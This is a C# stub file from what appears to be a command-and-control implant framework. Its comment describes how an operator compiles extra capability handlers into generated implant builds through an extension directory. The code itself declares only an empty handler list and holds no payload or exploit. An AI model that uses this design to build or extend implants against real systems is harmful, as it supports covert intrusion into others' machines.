namespace Rod.Implant.Internal;

// The out-of-tree handler registrations for the tradecraft extension kit
// (extending/tradecraft.md): the compile-time seam that lets an operator
// compile additional capability handlers into a generated artifact without
// maintaining a fork of the implant tree. The .NET build unit overlays the
// configured extension directory's sources onto the per-build staging copy and
// replaces this file with generated registrations for every class there that
// implements ICapabilityHandler -- the same replace-the-stub shape as
// BakedProfile.cs. This checked-in stub compiles empty, so the dev binary (and
// every build with no extension directory configured) carries no extension
// handlers; HandlerRegistry.Default appends the list after the reference set,
// so an extension handler widens the compiled set and the advertised verbs
// without touching the beacon loop.

internal static class ExtensionRegistrations
{
    /// <summary>
    /// The out-of-tree handlers the build unit baked in; empty in the dev stub.
    /// </summary>
    public static readonly IReadOnlyList<ICapabilityHandler> Handlers = Array.Empty<ICapabilityHandler>();
}
